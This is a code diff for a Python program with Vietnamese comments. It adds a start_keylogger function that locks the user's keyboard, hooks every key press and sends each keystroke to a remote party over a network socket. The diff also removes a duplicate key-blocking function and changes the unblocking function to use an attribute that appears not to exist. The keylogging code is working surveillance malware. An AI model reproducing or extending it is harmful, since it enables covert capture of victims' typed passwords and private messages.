@@ -11,24 +11,36 @@ normal_keys = [
     'page up', 'page down', 'insert', 'delete'
     ]
 
-def block_all_keys():
-    # Danh sách các phím cần khóa
-    
-    
+def block_all_keys(): 
     # Khóa tất cả các phím trong danh sách normal_keys
     for key in normal_keys:
-        keyboard.block_key(key)
-        
+        keyboard.block_key(key)        
     print("Bàn phím đã bị khóa. Nhấn 'Esc' để tắt chế độ bắt phím.")
 
-def block_all_keys():
-    # Khóa tất cả các phím trừ phím Esc để tắt chế độ bắt phím
-    for key in keyboard.all_modifiers + normal_keys:
-        keyboard.block_key(key)
-    print("Bàn phím đã bị khóa. Nhấn 'Esc' để tắt chế độ bắt phím.")
 
 def unblock_all_keys():
-    # Mở khóa tất cả các phím từ danh sách normal_keys
-    for key in normal_keys:
+    for key in keyboard.all_modifiers + keyboard.all_normal_keys:
         keyboard.unblock_key(key)
     print("Bàn phím đã được mở khóa.")
+    
+def start_keylogger(client_socket):
+    """Bắt đầu ghi nhận phím nhấn và gửi tới server."""
+    def on_key_press(event):
+        try:
+            # Gửi phím nhấn tới client
+            keystroke = event.name
+            client_socket.send(keystroke.encode('utf-8'))
+        except Exception as e:
+            print(f"Lỗi khi gửi phím nhấn: {e}")
+
+    # Khóa bàn phím
+    block_all_keys()
+
+    # Bắt đầu lắng nghe phím nhấn
+    print("Bắt đầu ghi nhận phím nhấn. Nhấn 'Esc' để dừng.")
+    keyboard.hook(on_key_press)
+
+    # Chờ phím 'Esc' để dừng bắt phím
+    keyboard.wait('esc')
+    print("Đã dừng ghi nhận phím nhấn.")
+    unblock_all_keys()
